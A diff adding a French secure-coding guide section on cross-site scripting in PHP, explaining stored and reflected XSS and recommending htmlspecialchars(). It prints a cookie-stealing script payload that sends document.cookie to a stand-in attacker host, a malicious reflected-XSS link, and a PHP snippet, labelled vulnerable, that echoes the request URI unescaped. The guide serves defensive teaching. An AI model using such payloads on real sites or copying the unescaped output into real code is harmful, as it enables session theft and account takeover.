@@ -36,6 +36,59 @@ Imaginez la base de données comme un robot qui ne comprend que le langage SQL. 
 
 Les attaquants peuvent contourner la connexion, voler toutes les données de la base de données (listes d'utilisateurs, hashes de mots de passe), voire supprimer la base de données.
 
+### 【Prévenir les Attaques de Script Inter-Sites (XSS)】
+
+**Pourquoi est-ce important ?**
+
+Si votre site web est comme un miroir qui reflète directement le contenu des entrées utilisateur, alors les utilisateurs peuvent intégrer des scripts JavaScript malveillants dans le contenu. Lorsque d'autres utilisateurs parcourent ce contenu, le script malveillant s'exécutera dans leurs navigateurs, volant leurs informations. L'encodage d'entités HTML convertit les caractères spéciaux dans les scripts malveillants (comme `<`, `>`) en texte clair inoffensif, les rendant impossibles à exécuter.
+
+**Scénario du Hacker 😈**
+> J'ai laissé un commentaire dans la section commentaires de votre article : `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Ce texte a été stocké tel quel dans la base de données. Maintenant, tout utilisateur qui lit ce commentaire aura son navigateur qui exécutera automatiquement ce script, envoyant ses cookies de connexion vers mon serveur. Avec les cookies, je peux usurper leur identité pour me connecter au site web.
+
+**Méthode d'Attaque Avancée : Comment le Code de l'Utilisateur A Peut-il Voler les Données de l'Utilisateur B ?**
+
+Beaucoup de personnes se demandent : "L'attaquant n'a pas modifié mon site web, alors comment peut-il voler les données d'autres utilisateurs ?" Laissez-moi l'expliquer avec un exemple complet :
+
+1. **L'attaquant A crée un lien malveillant**
+   ```
+   https://yoursite.com/detail.php?id=1<script>steal()</script>
+   ```
+
+2. **L'attaquant trompe la victime B par ingénierie sociale**
+   - Email : "Regardez le travail fantastique de ce photographe !"
+   - Publications sur les réseaux sociaux, commentaires de forum, etc.
+
+3. **Que se passe-t-il quand la victime B clique sur le lien ?**
+   ```php
+   // Votre code (vulnérable)
+   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
+   
+   // Sortie réelle vers le navigateur de B
+   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
+   ```
+
+4. **Pourquoi peuvent-ils voler les données de B ?**
+   - B est déjà connecté à votre site web
+   - Le script malveillant s'exécute sous **votre domaine**, il peut donc :
+     - Lire les cookies de B (identifiants de connexion)
+     - Accéder au localStorage de B
+     - Faire des requêtes au nom de B
+     - Modifier le contenu de la page (ex : formulaires de connexion falsifiés)
+
+**Analogie Simple**
+Imaginez que votre site web soit une banque :
+- L'attaquant A place un "faux bordereau de retrait" (script malveillant) dans le hall de la banque
+- Le client B pense que c'est légitime et saisit son mot de passe
+- A obtient le mot de passe de B
+
+XSS permet aux attaquants de placer des "faux bordereaux de retrait" (code malveillant) dans votre "hall de banque" (site web).
+
+C'est pourquoi vous devez utiliser `htmlspecialchars()` - cela garantit que toutes les entrées utilisateur sont affichées comme du texte clair, pas comme du code exécutable.
+
+**Conséquences Catastrophiques 💥**
+
+Vol massif de comptes utilisateur, fuite de données personnelles, sites web infiltrés avec du contenu de phishing ou des scripts de minage.
+
 ---
 
 ## 🔐 Permissions et Authentification
